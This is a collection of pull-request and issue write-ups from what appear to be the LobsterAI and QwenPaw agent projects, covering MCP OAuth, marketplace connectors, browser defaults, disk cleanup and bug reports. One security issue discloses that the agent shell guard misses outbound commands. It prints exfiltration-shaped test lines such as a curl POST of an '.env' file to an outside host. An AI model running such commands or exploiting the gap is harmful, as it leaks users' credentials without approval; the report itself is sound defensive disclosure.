prs.title: feat(mcp): sign in to remote MCP servers with OAuth
prs.body:
## Summary

Remote MCP servers (Streamable HTTP / SSE) can sign in with MCP OAuth 2.1 instead of a pasted API key. OpenClaw v2026.8.1 already runs the whole flow (discovery, dynamic client registration, PKCE, loopback callback, token storage and refresh); LobsterAI writes `auth: "oauth"` into `openclaw.json` and drives `openclaw mcp login | logout | status`.

This PR brings **@alison-xx**'s #2874 (opened against `main`) into `release/2026.10.19`, plus a follow-up commit with fixes and UI polish from review and in-app testing. The two original commits are unchanged and keep @alison-xx as their author.

## Related Issue

Includes #2874 by @alison-xx.

## Changes Made

**From #2874 (@alison-xx)** — `3b46ffd`, `3f5c3ac`
- Optional `auth: 'oauth'` on remote servers, written to `openclaw.json` (the ignored `authorization` header is dropped).
- `mcpOAuthCli` driver: runs the OpenClaw CLI like the gateway does, opens the printed authorization URL once (http/https only), detects a busy loopback port before opening the browser, parses `mcp status --json`.
- IPC `mcp:oauthLogin`, `mcp:oauthLogout`, `mcp:oauthStatus`; an Authentication choice in the server form; zh/en strings; design doc.

**Follow-up** — `37db4f6`
- **Cancel and cleanup:** a pending sign-in can be cancelled (new `mcp:oauthCancel` IPC). Every pending `openclaw mcp login` is stopped on app quit, so none keeps `127.0.0.1:8989`.
- **Token cleanup:** before a server is deleted or loses its OAuth identity (rename, URL change, auth turned off, switch to stdio), its tokens are cleared, so they don't linger or come back when the same server is re-added.
- **Disabled servers:** they are treated as not loaded, and sign-out syncs `openclaw.json` first. This fixes a false "sign-out failed" right after a toggle, when the status read still saw the old config.
- **CLI errors:** color codes and unrelated `[config] warnings` lines are stripped. "No MCP server named" maps to `server_not_loaded` with a clear message.
- **JSON import:** keeps `auth: "oauth"`.
- **Card UI:** "Sign in" reuses the marketplace Qichacha capsule and wording, placed at the bottom right of installed cards so the header stays name + toggle. It turns into Cancel while the browser step is pending. Badges only show state (Authorizing… / Authorized). The detail dialog shows the authorization state and a Sign in / Cancel action, with Sign out in its footer.
- **Card cleanup:** installed cards no longer repeat the URL/command in the badge row; the description line already falls back to it.
- **Copy:** the form says tool preview isn't available for OAuth servers, instead of promising it after sign-in.

## Type of Change

- [x] Bug fix (non-breaking change which fixes an issue)
- [x] New feature (non-breaking change which adds functionality)
- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)
- [ ] Code refactoring
- [x] Documentation update
- [ ] Performance improvement
- [ ] Other (please describe):

## Testing

- [x] Tested locally
- [x] Added new tests
- [x] Updated existing tests
- [x] Manual testing performed

- `npm test`: 7592 passed, 157 skipped, 1 failed. The failure is `src/main/skills/skillManager.watcher.test.ts` (a file-watcher timing test, untouched by this branch); it timed out under full-suite load and passes when re-run alone (2/2).
- `tsc` (renderer) and `npm run compile:electron`: clean. ESLint with `--max-warnings 0` on all changed files: clean.
- New unit tests cover cancel (CLI killed, port freed), sign-out mapping, best-effort token cleanup, the identity-change check, CLI output cleanup (using real stderr captured from the runtime), and JSON import of `auth`.
- **End-to-end against the real OpenClaw v2026.8.1 runtime**, with a local MCP OAuth server (DCR + PKCE + approval page):
  - sign-in through the loopback callback; a second sign-in reuses the stored token;
  - deny on the approval page fails cleanly;
  - `openclaw mcp probe` lists the server's tools with the stored token;
  - revoking tokens server-side moves the state to pending, and signing in again works;

- **OpenClaw config:** remote servers with `auth: 'oauth'` get `auth: "oauth"` in `mcp.servers`, without an `authorization` header. Signing in needs no gateway restart, because the gateway reads the stored token on every request.
- **Runtime:** the main process spawns short-lived `openclaw mcp …` CLI processes (Electron as Node, same state dir, config and secrets as the gateway); a pending login is killed on cancel and on app quit.

- **Token identity:** tokens are keyed by server name + URL, so a rename or URL change requires signing in again.
- **Out of scope:** marketplace entries can't declare `auth: 'oauth'` yet.

prs.title: feat(mcp): install remote connectors from the marketplace with token forms and OAuth
prs.body:
## Summary

Marketplace entries could only describe stdio servers (`command` + env keys), so a remote entry installed with an empty URL. This PR lets an entry describe a remote (SSE / Streamable HTTP) MCP connector that uses either a declarative credential form or OAuth. It reuses the remote OAuth sign-in shipped in #2874 / #2905.

### Marketplace schema additions (all optional; stdio entries unchanged)
- `url`: may contain `${FIELD_KEY}` placeholders. They are substituted at save time; values are percent-encoded unless the field type is `url`. A malformed or unknown placeholder is rejected.
- `auth: "oauth"`: installs in one click with `auth: oauth` and no credential form. The marketplace card and the installed card then offer the existing Sign in capsule.
- `tokenSchema` `{ title, description, docUrl, docLabel, fields[{ key, label, type: text|password|url, required, placeholder, description, defaultValue }] }`, each text with an `_en` variant. It renders as the credential form in registry install mode: secrets are masked with a show/hide toggle, and the doc link opens through the existing shell bridge. The form comes back on edit, filled with the saved values; they are stored as `tokenValues` in the server config.
- `tokenAuth.headers` `{ "<Header>": { field, prefix? } }`: the field must exist; `host`, `content-length`, `connection` and `transfer-encoding` are rejected; the prefix must not contain CR, LF or NUL.
- `allowedTools` → `toolFilter.include`; `requestTimeoutMs` / `connectionTimeoutMs` are passed through to OpenClaw's per-server fields.
- `examples_zh` / `examples_en`: shown as "Try asking" in the detail dialog.

Entries that fail validation are left out of the marketplace and logged with `console.warn`. New strings are added in zh and en; the new discriminants are shared constants in `src/shared/mcp/marketplace.ts`.

### Fix: `${VAR}` in user values written to openclaw.json
OpenClaw substitutes `${UPPER_CASE}` in every config string from the gateway env. Before this PR, a custom server header such as `Bearer ${LOBSTER_PROXY_TOKEN}`, or a `${...}` in a URL query, was filled with the real secret and sent to the remote server. `buildOpenClawMcpServers` now escapes `${` to `$${` in url, headers, env, args, command, cwd and toolFilter. This changes behaviour for anyone who deliberately referenced gateway env vars in a custom MCP config.

### Dev-only helper
`LOBSTERAI_MCP_MARKETPLACE_FILE=/path/catalog.json` (unpackaged builds only) replaces the fetched catalog, so ops can preview entries before publishing.

### Electron / OpenClaw notes
- New IPC payload fields on `mcp:create` / `mcp:update`: `tokenValues`, `requestTimeoutMs`, `connectionTimeoutMs`. No new channels.
- openclaw.json: escaped literals, plus optional `requestTimeoutMs` / `connectionTimeoutMs` per server.
- No OpenClaw restart behaviour changed: MCP changes still go through the existing sync path, and no secret env vars were added.

## Verification
- New Vitest coverage:
  - URL template substitution and percent-encoding
  - `${` escaping, round-tripped through a mirror of OpenClaw's substitution parser
  - tokenSchema / tokenAuth validation (forbidden headers, CR/LF/NUL prefixes, unknown fields, malformed placeholders)
  - payload mapping for the Tencent Docs, Baidu Maps and Notion entries
  - store persistence
  - config-sync escaping and timeouts
- `npm test`: the first full run passed. A second full run had one timing-sensitive failure in `skillManager.watcher.test.ts`, which this PR does not touch; it passed 3 out of 3 times when run alone. `npm run compile:electron`, the renderer `tsc`, and ESLint on the touched files under the CI command all pass.
- End to end in an isolated dev instance (separate userData; local catalog with three test entries):
  - **Tencent Docs** (`https://docs.qq.com/openapi/mcp`, `Authorization` bound to a token field): required-field validation works. Tool discovery with a fake token reached the server and got `invalid_token` back. Install wrote the header, and editing shows the masked form again.
  - **Baidu Maps** (URL template `?ak=${BAIDU_MAP_AK}`): the AK is encoded into the URL, 14 tools are listed, and `requestTimeoutMs` is written.
  - **Notion remote** (`https://mcp.notion.com/mcp`, `auth: "oauth"`): one-click install wrote `auth: "oauth"`, OpenClaw status is `unauthenticated`, and the card shows Sign in.
  - The generated openclaw.json was read back with the pinned runtime's own `resolveConfigEnvVars`: escaped values resolve to the literal text, while unescaped ones leaked the token.
- **Not tested:** the Notion browser sign-in itself (it needs a real account), and real Tencent Docs or Baidu Maps credentials.

The catalog content and icons are ops work in the server-side marketplace JSON; this PR ships no catalog entries.

## Heads-up: overlap with #2908
The OAuth hardening PR #2908 (`fix/mcp-oauth-hardening`) touches the same files: `src/main/ipcHandlers/mcp/handlers.ts`, `src/main/libs/openclawConfigSync.ts`, `src/renderer/components/mcp/McpManager.tsx` and `src/renderer/services/i18n.ts`. Whichever PR merges second will need to resolve the conflicts. They do not conflict in meaning: #2908 exports `buildOpenClawMcpServers` for its temp-config CLI calls, so it inherits the escaping added here.

prs.title: feat(browser): default to the in-app browser
prs.body:
## Summary

Make the LobsterAI in-app browser the default so Agent web browsing/search stays inside the app instead of launching a separate Chrome window, and fix issues that surface once it is used for runs without a visible browser panel.

### Default + migration
- `defaultBrowserWebAccessConfig.displayMode` → `in-app`.
- Existing installs: the renderer persists the normalized browser config on every launch, so older installs carry an explicit `external` value that a new default cannot change. `migrateBrowserDisplayModeToInApp` switches them **once** in the main process, before the first OpenClaw config sync (window not created yet → no write race with the renderer, no gateway restart after load).
- The applied version is stored as top-level `app_config.browserDisplayModeMigrationVersion`; the renderer's default config records it so fresh installs are never migrated and a later explicit "external" choice is kept.

### In-app browser fixes
- **Zero-size viewport when the panel is hidden** (IM channels, scheduled tasks, another session, minimized window): new `WebContentsView`s were only sized when attached. Verified with Electron 43.5.0: a never-attached view has `innerWidth 0`, and `Page.captureScreenshot` never returns. New pages and the credential-login view now start at the last panel size, or 1280×800.
- Agent `take_screenshot` now has the same 10s timeout as the clipboard capture path (shared `capturePageScreenshot`).
- The agent browser session presents the plain Chrome user agent (drops the app and `Electron/x` tokens that e.g. Google sign-in rejects).
- Non-URL address-bar text searches Baidu (zh) / Bing (en) instead of Google, which is unreachable without a proxy in mainland China (in-app browser and artifact preview address bar).

## Electron-specific behavior changes
- **Storage**: one-time `app_config` write at startup (`browserWebAccess.displayMode`, `browserDisplayModeMigrationVersion`).
- **OpenClaw config**: migrated installs render the `lobster-in-app` browser profile (existing-session driver over the MCP bridge) and the saved-credential MCP server instead of the managed Chrome profile.
- Logins made in the previous OpenClaw-managed Chrome profile are not carried over to the in-app partition.

## Testing
- `npm test`: 7733 passed (new tests for the migration, detached viewport, screenshot timeout, user agent and search URL).
- ESLint (CI rules) clean on all touched files; `tsc` and `npm run compile:electron` pass.
- Manual `npm run electron:dev` validation **not done yet** — suggested checks:
  1. Start with an `external` config → log shows `[Browser] switched the browser display mode to in-app`; settings show the in-app browser. Switch back to external and restart → stays external.
  2. With the browser panel closed / another session open / window minimized, ask the Agent to search and take a screenshot → returns instead of hanging.
  3. IM-triggered task that browses the web.

prs.title: feat(cowork): show turn credits and model preset for IM and cron runs
prs.body:
## Summary

Turns started from the desktop already show their credits when they use a package model. Turns that OpenClaw starts on its own, from IM messages and scheduled tasks, now show them too, along with the 快速/旗舰 preset label.

These runs have no client trace. Their model requests still carry OpenClaw's own `traceparent`, and lobsterai-server already records usage by that trace. So the client only needs to learn which trace belongs to which local turn.

- **Plugin:** `lobster-model-routing` registers `model_call_started`. For each run it reports the package-model trace once to the local token proxy (`POST /lobsterai/native-run-llm-traces`), along with the resolved model and the virtual preset (`yd-fast`/`yd-ultra`) when one was used. The proxy answers locally and forwards nothing.
- **Binding:** `nativeRunTurnUsage.ts` keeps traces and media task ids per run id. When the turn ends, `CoworkTurnUsageService` binds them to the run's synced user message (`llmTrace`, `turnMediaTaskIds`, `modelPresetId`/`resolvedModelId`). It then settles through the existing `GET /api/usage/llm-traces/{traceId}`. Desktop traces registered for `chat.send` are ignored.
- **When settlement runs:**
  - Turns the adapter follows settle on `complete`/`error`, using the turn's run ids. This covers cron runs.
  - IM runs often have no local turn and only get `sessions.changed` lifecycle events. They now sync the conversation history on lifecycle end, then settle.
- **Retried cron runs:** OpenClaw gives each attempt its own trace. Those traces are stored as `relatedTraceIds`, and their summaries are merged.
- **Safety:**
  - Usage is never bound to a user message that was answered before the run started. This uses OpenClaw's run start `ts`.
  - History reconciliation now keeps usage/preset metadata when it replaces user messages.
  - Persisting falls back to the replaced copy of the message.
- **UI:**
  - IM/cron replies take the preset label from their user message, for example `快速（deepseek-flash）`.
  - The model label is removed from under user input. It now only shows after replies, on desktop too.
- **Dev tooling:** the startup sync of `openclaw-extensions` now removes a stale precompiled `.js` bundle when the TypeScript source changes. Before, OpenClaw kept loading the old bundle until `npm run openclaw:precompile` ran.

The server API is unchanged.

## Electron-specific behavior

- **OpenClaw plugin:** `lobster-model-routing` adds a `model_call_started` hook. In dev, the change is picked up after the extension sync and a gateway restart. Packaged builds precompile it as before.
- **Token proxy:** adds a loopback-only route behind the existing inbound proxy token.
- **Runtime/IPC:** `CoworkRuntime` gains optional `getTurnRunIds`. The adapter gains an `onChannelRunEnded` option. There are no new IPC channels: credits still reach the renderer through `cowork:stream:turnUsage`.
- **Storage:** IM/cron user messages may now carry `llmTrace`, `turnUsage`, `turnMediaTaskIds`, `modelPresetId` and `resolvedModelId` metadata. There is no schema change.
- **Load:** each IM turn end now triggers one extra `chat.history` sync. Each settled turn makes one usage summary request per trace.

## Not covered

- Messages from before this change get no credits or preset label.
- Subagent runs keep the existing behavior.
- IM replies on `yd-fast`/`yd-ultra` can show an OpenClaw "Model Fallback" notice. That comes from the virtual model routing added on 10-16, not from this change, and is tracked separately.

## Testing

- Added Vitest coverage for:
  - trace merging
  - the native run registry
  - the proxy route
  - binding, the stale-turn guard and replaced-message persistence
  - IM lifecycle settlement
  - reconciliation metadata carry-over
  - the reply preset label
  - stale bundle removal
- `npm test` passes except for unrelated suites that fail only under full-suite load and pass in isolation.
- CI eslint on touched files, `npm run compile:electron` and `npx tsc --noEmit` pass.
- Manually checked in `npm run electron:dev`:
  - credits show for a scheduled task and for WeChat messages
  - `快速（deepseek-flash）` shows on IM replies
  - no model label shows under user input

prs.title: test(openclaw): keep repair prune fixture mtime independent of the real clock
prs.body:
## Summary

`openclawCompatibilityRepair.test.ts > retained runs lose regenerable caches but keep state and site data, and the manifest records it` fails on `release/2026.10.19` since roughly 2026-10-17 11:00 UTC.

**Root cause (test-only):** `backupRuns()` sets each fixture run's mtime last, but this test then writes the snapshot manifest into `runs[0]`, which bumps that directory's mtime to the real clock. The prune runs with an injected `NOW = 2026-10-17T12:00Z` and treats any run with `NOW - mtime < 1h` as possibly in progress, so once real time passed `NOW - 1h`, `runs[0]` was skipped and its caches were not stripped.

**Fix:** restore `runs[0]`'s mtime after writing the manifest. `pruneOpenClawRepairBackups` is unchanged; treating a run with a future mtime as in progress is the intended conservative behavior (covered by the `oldest-named` in-progress case).

The other fixed-clock disk cleanup tests (`openclawSessionImportArchiveCleanup`, `openclawSessionStoreTempCleanup`) already set mtimes after writing, so they are not affected.

## Test plan

- [x] `npx vitest run src/main/libs/openclawCompatibilityRepair.test.ts src/main/libs/openclawCompatibilityRepairCore.test.ts src/main/libs/openclawStartupDiskCleanup.test.ts src/main/libs/openclawRepairSnapshotPaths.test.ts`: 70 passed
- [x] `npx eslint --ext ts,tsx --report-unused-disable-directives --max-warnings 0 src/main/libs/openclawCompatibilityRepair.test.ts`: clean

## Summary

Removes the Claude Agent SDK-era **OpenAI compatibility proxy** (`coworkOpenAICompatProxy.ts` and `coworkFormatTransform.ts`, about 3500 lines). It translated Anthropic `/v1/messages` to OpenAI Chat Completions or Responses. The agent runtime is OpenClaw now, so only two live users were left, and both get a smaller replacement. Design doc: `specs/refactors/remove-cowork-compat-proxy/2026-10-17-remove-cowork-compat-proxy-design.md`.

Commits, in order:

1. **Delete dead code:** `getEnhancedEnv`, the model probe, `get-api-config` / `save-api-config` IPC and `api-config.json`, the Claude SDK telemetry and count-tokens routes, and the unused passthrough route.
2. **`copilotLoopbackProxy.ts`:** the Copilot passthrough that OpenClaw's `lobsterai-copilot` provider uses, moved out unchanged. It keeps the same path, port key, `LOBSTER_PROXY_TOKEN` auth and 401/403 refresh-and-retry, so `openclaw.json` does not change and no gateway restart follows the upgrade.
3. **`oneShotModelClient.ts`:** sessionless streamed text calls. It resolves the model through the same `buildProviderSelection()` that renders `openclaw.json`, so its transport and endpoint always match the agent runtime. It supports Anthropic, Chat Completions, Responses and Gemini, and the loopback token routes server models and Copilot like OpenClaw does.
4. **Callers moved off the proxy:**
   - Desktop companion quick answers use the one-shot client.
   - `check-api-config` uses the raw config. An OpenAI-format model is no longer reported as "no model" when the proxy fails to start, and the response no longer carries API keys to the renderer.
5. **Delete the proxy and what only it used:** `resolveCurrentApiConfig`, the server token refresher and `setCoworkProxySessionId`.
6. **IM cleanup:**
   - Removed the dead `IMChatHandler`, the scheduled-task LLM detector, the `processMessage` path of `IMCoworkHandler`, and helpers and i18n keys only those used.
   - Removed the unused `skillsEnabled` and `systemPrompt` IM settings.
   - Per-message IM logs moved to debug.

Net change: about 7000 lines removed.

## Electron-specific behavior

- **Startup:** the compat proxy no longer starts. The Copilot loopback proxy starts in its place, before the first config sync, on the same remembered port.
- **Quick answers:**
  - They now call the upstream directly, or go through the token proxy or the Copilot passthrough, like OpenClaw does.
  - Responses-mode and custom Gemini providers now work.
  - ChatGPT OAuth and other OAuth providers whose credential isn't in the rendered config now show an explicit "not supported" message. They didn't work through the proxy either.
- **`check-api-config` IPC:** returns `{ hasConfig, error }`.
- **IM plugin approvals:** the 60 s auto-deny for channel plugin approvals is kept unchanged.

## Testing

- CI eslint on touched files, `npm run compile:electron` and `npm run build` pass, and the legacy IM `node:test` suites pass.
- New unit tests cover the Copilot proxy (auth, host check, retry, streaming), the one-shot client (four transports, token placeholders, unsupported routes), the new SSE readers and quick answer integration.

prs.title: fix(openclaw): bound disk usage of repair backups and runtime caches
prs.body:
## Summary

A long-running install reached ~17G under `~/Library/Application Support/LobsterAI`. Most of it came from OpenClaw data that only grows and is never cleaned up. End users hit the same sources, so this PR bounds each one from the LobsterAI side, without an OpenClaw patch.

| Source | Observed | Change |
|---|---|---|
| `openclaw/repair-backups` | 8.2G (2 runs) | Snapshots skip regenerable caches. At most 2 runs are kept, none older than 14 days; the current run is always kept. Pruning runs after each repair and in the background cleanup, and caches are stripped from retained older runs. |
| `state/.compile-cache` | 1.0G | Subdirectories left by other Node/Electron versions are removed. |
| Agent browser caches | 1.6G + 0.9G (`~/Library/Caches`) | The HTTP cache is capped via `--disk-cache-size` in `browser.extraArgs`. Once a day, if no Chrome holds the profile and its caches exceed 512 MiB, `Cache`, `Code Cache`, `GPUCache` and `Service Worker` are cleared. Cookies, Local Storage, IndexedDB and Login Data are never touched. |
| `agents/*/sessions/sessions.json.*.tmp` | 249M | Orphaned files older than 7 days are removed, matching OpenClaw's own temp file name pattern. |
| `*.jsonl.deleted.*` / `*.reset.*` archives | 50M | `session.maintenance.resetArchiveRetention` is set to `30d`, so OpenClaw expires both the files and their `session_transcript_archives` rows. |
| `agents/*/session-sqlite-import-archive` | ~1G | Removed 14 days after the last clean session→SQLite migration. Archives are kept while the newest migration run is in flight, failed or unreadable, since `doctor --session-sqlite recover` may need them. LobsterAI itself only runs `import`. |

### Cleanup timing and pacing

All cleanups live in `openclawStartupDiskCleanup.ts`. A first pass after an upgrade can delete several hundred thousand files; on the reporter's machine the old snapshots' compile caches alone held ~266k. To keep that off low-end machines' disks:

- **Deferred:** a pass starts 60s after the gateway reports `running`. Gateway restarts inside the window share one pending pass, and timers are `unref`'d.
- **Paced:** `openclawDiskCleanupThrottle.ts` runs deletions in 20ms work slices with 80ms rests (about 20% duty cycle). Steps run one at a time, cheapest per byte first: session temps, import archives, browser caches, repair backups, compile cache.
- **Bounded:** each pass stops after 5 minutes of wall time. A stopped pass retries after 30 minutes and on the next app start.
- **Battery:** the pass is skipped on battery power (`powerMonitor.isOnBatteryPower()`), and a running pass stops at its next rest once the laptop switches to battery.
- **Resumable:** every step is idempotent. Repair backup runs and import archives are renamed aside (`.lobsterai-stale-*`) before deletion, so a partly removed one is finished later and is never mistaken for an in-progress repair or a recently modified archive. The post-repair prune is paced the same way.

Measured on an M1 with 100k small files: unpaced deletion ran at ~9.7k files/s using a full core; paced deletion runs at ~1.1k files/s using ~0.2 of a core, with main-process event-loop lag ≤ 8ms. One pass can therefore delete roughly 330k files there; slower disks take more passes.

Every step is best-effort, logs its own failures, and never follows symlinks or Windows junctions. A repair backup run modified in the last hour is never touched.

## Behavior changes to note

- **OpenClaw config:** `openclaw.json` gains `--disk-cache-size` in `browser.extraArgs` and `session.maintenance.resetArchiveRetention: "30d"`. The first config sync after an upgrade may restart the gateway once.
- **History:** LobsterAI's visible chat history is in `lobsterai.sqlite` and is unaffected. `chat.history` reads only the current transcript generation, never the `.deleted`/`.reset` archives.
- **Repair helper:** the snapshot exclusions take effect once the bundled `openclaw-gateway-repair.mjs` is rebuilt, which happens in the normal runtime build.

## Test plan

- [x] `npx vitest run src/main/libs/openclaw src/main/openclawSessionPolicy src/main/libs/removeTreeNoFollow`: 1226 passed
- [x] `npx eslint --ext ts,tsx --report-unused-disable-directives --max-warnings 0` on touched files
- [x] `npm run compile:electron`
- [ ] Manual check with `npm run electron:dev` on an existing profile: about 60s after the gateway is running (on AC power), the cleanup log lines appear, the agent browser keeps its logins, and one-click repair succeeds with a slimmer snapshot

prs.title: fix(kits): recover online catalog after network failures
prs.body:
## Summary
A temporary kit-store request failure used to be returned as a successful built-in-only catalog and cached for the rest of the session. Online kits could remain missing after connectivity recovered. This change preserves usable kits, reports failures, and restores the online catalog through automatic or manual retry.

## Related Issue
No linked issue.

## Changes Made
- Cache only successful online catalogs for five minutes; preserve the last successful catalog and built-in kits during failures without marking fallback data fresh.
- Refresh on connectivity restoration and allow an in-flight failed request to finish before sharing one follow-up request. Reopening the catalog also retries failures.
- Show a localized failure message and retry button while retaining visible kits during refresh.
- Fetch the public catalog through Electron networking with a ten-second deadline and propagate explicit failure state through the typed IPC response.

## Type of Change
- [x] Bug fix (non-breaking change which fixes an issue)

- [x] Tested locally
- [x] Added new tests
- [x] Updated existing tests

Validated in an isolated macOS Electron development profile using the actual main/preload/renderer paths: simulated catalog timeout, built-in fallback, retry against the live public endpoint, preservation of the previous online catalog, and an online event arriving before a pending request failed. issues.title: [Bug]: v2.3.0b2 在受限环境(fnOS 应用沙箱)启动即崩:dependency_maintenance 锁根目录优先按 pwd home 推导,绕过了 $HOME,且覆盖变量 QWENPAW_DEPENDENCY_STATE_DIR 未在文档中说明
issues.body:
## QwenPaw Version

2.3.0b2(PyPI wheel)

## Description

在受限部署环境(飞牛 fnOS NAS 应用沙箱)中,`pip install qwenpaw==2.3.0b2` 后以专用应用用户运行 `python3 -m qwenpaw app`,**import 阶段即崩溃**,进程无法启动。

根因:`qwenpaw/plugins/dependency_maintenance.py` 的 `state_root()` 在解析依赖托管锁根目录时,**优先取 `pwd.getpwuid(os.getuid()).pw_dir`(passwd 数据库的 home),而不是 `os.environ["HOME"]`**。fnOS 这类托管环境会为应用创建专用用户(passwd 中 home 为 `/home/<appuser>`),但该目录实际不存在且 `/home` 对应用用户不可写,于是 `_open_lock()` 内的 `Path(...).mkdir(parents=True)` 抛出 `PermissionError: [Errno 13] Permission denied: '/home/qwenpaw'`,发生在 `qwenpaw/__init__.py` 的 import 期,进程必然退出。

代码中其实已提供覆盖变量 **`QWENPAW_DEPENDENCY_STATE_DIR`**(优先级最高),实测设置后可正常启动——但该变量未在任何文档中出现,受限环境的用户无从得知。

建议(任选或组合):
1. 解析顺序改为 `QWENPAW_DEPENDENCY_STATE_DIR` → `$HOME` → `pwd.pw_dir`(与多数工具一致,pw_dir 在托管环境往往是错的);
2. `state_root()` 失败时给出可操作的错误信息,指明可设置 `QWENPAW_DEPENDENCY_STATE_DIR`;
3. 在文档中说明该变量。

**Related PR(s):** 无

**Security considerations:** 无(仅涉及部署环境下的路径与权限)

## Component(s) Affected

- [x] Core / Backend (app, agents, config, providers, utils, local_models)
- [ ] Console (frontend web UI)
- [ ] Channels (DingTalk, Feishu, QQ, Discord, iMessage, etc.)
- [ ] Skills
- [x] CLI
- [ ] Documentation (website)
- [ ] Tests
- [ ] CI/CD
- [ ] Scripts / Deploy

## Environment

- **QwenPaw version:** 2.3.0b2
- **OS:** 飞牛 fnOS 1.x(Debian 系 NAS 系统)
- **Install method:** pip(从 PyPI 镜像安装到专用 venv)
- **Python version:** 3.12(fnOS python312 依赖应用)

## Steps to Reproduce

1. 创建专用用户且不创建其 home 目录,例如 `useradd -M qwenpaw`(`/home` 为 root 所有,应用用户不可写)
2. 以该用户运行 venv 中的内核:`python3 -m qwenpaw app --host 0.0.0.0 --port 18088`
3. import 阶段立即崩溃

注:同类环境的 b1(2.3.0b1)不受影响——b2 才在 `qwenpaw/__init__.py` 引入了 import 期的 `lease_environment` 调用。

## Actual vs Expected

- **Actual:** `PermissionError: [Errno 13] Permission denied: '/home/qwenpaw'`,启动即崩,且错误信息未指向任何可操作的解决方案
- **Expected:** 尊重 `$HOME`(或至少在 pw_dir 不可用时回退),或给出指向 `QWENPAW_DEPENDENCY_STATE_DIR` 的清晰错误

## Logs / Screenshots

```
Traceback (most recent call last):
  File "<frozen runpy>", line 189, in _run_module_as_main
  File "/vol2/@apphome/qwenpaw/venv/lib/python3.12/site-packages/qwenpaw/__init__.py", line 11, in <module>
    _environment_custody.lease_environment(_environment_custody.host_sites())
  File ".../qwenpaw/plugins/dependency_maintenance.py", line 386, in lease_environment
    _lease_environment(sites, parent_pid, timeout)
  File ".../qwenpaw/plugins/dependency_maintenance.py", line 421, in _lease_environment
    with admission():
  File ".../qwenpaw/plugins/dependency_maintenance.py", line 414, in admission
    with file_lock(
  File ".../qwenpaw/plugins/dependency_maintenance.py", line 323, in file_lock
    descriptor = open_coordination_lock(path)
  File ".../qwenpaw/plugins/dependency_maintenance.py", line 310, in _open_lock
PermissionError: [Errno 13] Permission denied: '/home/qwenpaw'
```

相关代码(`state_root()` 解析顺序,`dependency_maintenance.py` 约 205-230 行):`QWENPAW_DEPENDENCY_STATE_DIR` 覆盖 → `pwd.getpwuid(os.getuid()).pw_dir` → `$HOME` → 报错。问题在于 pw_dir 的优先级高于 `$HOME`,且失败信息未提示覆盖变量。

## Additional Notes

- 已验证的 workaround:`export QWENPAW_DEPENDENCY_STATE_DIR=<可写的绝对路径>`(我们指向应用数据区),设置后 b2 可正常启动并运行。建议将此变量写入文档。

issues.title: Security: shell-wrapped outbound actions (SMTP send / HTTP POST / @file-to-network) execute with no findings or approval at AUTO/SMART — detector gap in tool_guard AND governance lanes
issues.body:
## Summary

QwenPaw's shell-command gate layers do not detect or gate **outbound-capable shell commands**. Under `approval_level: AUTO` (and equally under SMART governance), a shell command that sends email or performs an HTTP POST — including exfiltration-shaped reads of local files passed to the network (`--data-binary @file`) — executes with **zero findings and zero approval pends**.

## Reproduction (verified 2026-10-25, installed v2.2.2, macOS arm64)

Three commands executed via the agent's execute-shell tool with agent `approval_level: AUTO` and governance `execution_level: smart`. All three ran to completion with **no approval card and no findings**:

1. `himalaya message send <raw_email>` — real self-addressed SMTP send; result: `Message successfully sent`.
2. `curl -X POST https://httpbin.org/post` — explicit network write; result: HTTP 200.
3. `curl -X POST --data-binary @.env-decoy https://httpbin.org/post` — adversarial exfil-shaped decoy: contents of an `.env`-named file transmitted over the network; the endpoint received the full body. (Decoy contents were explicitly fake test data staged in the run ledger for exactly this test.)

## Root cause

- `runtime/tool_guard.py`: the pend fires only on **findings emitted by content guardians**. The guardian set has no detector class for outbound-capable commands: SMTP senders (sendmail/mutt/msmtp/himalaya and similar), POST-class flags of `curl`/`wget`/`httpie`, and network reads of local files via `@file` / `-F @*` / `--data-binary @*`.
- SMART mode does not compensate: it only auto-allows INFO/LOW findings. Since no finding is ever emitted, nothing is pended or denied.
- The governance lane (`governance/<agent>_<hash>/policy.yaml` with `execution_level: smart` + exact-match `user_rules`) equally lacks outbound shape detection.
- MCP driver-card `ask` policies ARE enforced correctly (pend cards fire) — the gap is specific to the shell-content guardians and governance rules.

## Suggested fix

- Add an **outbound-capable-command guardian class**: SMTP senders, HTTP POST-class flags of common CLI tools, and local-file-to-network argument reads. Surface at MEDIUM+ severity so AUTO/SMART pend (or deny) per policy.
- Optional escape hatch: `security.tool_guard.outbound_allow` — per-agent allow-listing for trusted outbound commands (e.g., package managers) so the new detector does not create noise.
- Adding the same shapes to governance `user_rules` matching would restore parity across the two gate lanes.

## Verified non-affected path (same session)

The MCP card path was proven working end-to-end in the same run: `create_issue` produced a live approval pend card with exact payload, root-session routing, approve→executes, and unattended 300s timeout → deny-safe. The gap is confined to shell-content detection.

## Impact

An agent with shell access can silently exfiltrate any locally readable file (credentials, `.env`, private data) to an attacker-controlled endpoint **without any approval, finding, or audit trail**, under both AUTO and SMART configurations. The only compensating control currently available is operational discipline (restricting external sends to separately gated agent sessions), which is not a technical gate.

Environment: QwenPaw 2.2.2, macOS arm64 (Darwin 25.6.0), agent `approval_level: AUTO`, governance `execution_level: smart`. Repro details and in-run evidence available on request.

issues.title: [Bug]: OpenAI-compatible gateway bare APIError with real status only in message text (`status_code=502, ...`) is classified as `unknown` — no retry, no model fallback
issues.body:
## English summary

When an OpenAI-compatible gateway/relay fails mid-stream, the OpenAI SDK raises a **bare `openai.APIError`** (no `status_code`, no `response`) whose only status hint is plain text like:

```
status_code=502, 请联系管理员处理！ (request id: ...)
```

`extract_status_code()` only recognizes the narrow `"Streaming response failed: [5xx]"` message format, so this error is classified as `unknown` by `classify_model_error()` → **neither same-model retry nor cross-model fallback fires**, and the whole turn/cron job dies. A genuine HTTP 502 from the same gateway WOULD be `transient` and fallback-eligible, so identical upstream failures behave inconsistently depending only on how the gateway wraps them.

Observed in production today: 3 scheduled agent jobs (07:30 / 08:00 / 09:30) all failed with no fallback, no message delivered. Reproduced against `classify_model_error` with the exact logged exceptions (see below).

Suggestion: extend `error_utils.extract_status_code()` to also recognize `status_code=5xx`-style patterns in gateway messages (keep it narrow, e.g. `\bstatus_code\s*=\s*([1-5]\d{2})\b`), or treat bare `openai.APIError` with a `5xx` in the message as transient. Related but distinct from #8092 (that one is about content-inspection text being misclassified as `bad_request`; this one is about status extraction missing a gateway message format).

## 环境 / Environment

- QwenPaw 2.2.2.post1（Docker `agentscope/qwenpaw:latest`），Debian 13 宿主机
- 模型走 OpenAI 兼容中转网关（relay），主模型 `deepseek-v4.1-flash`，已配置 `fallback_models`（zhipu-cn / glm-5.3-flash），`fallback_policy.enabled=true`

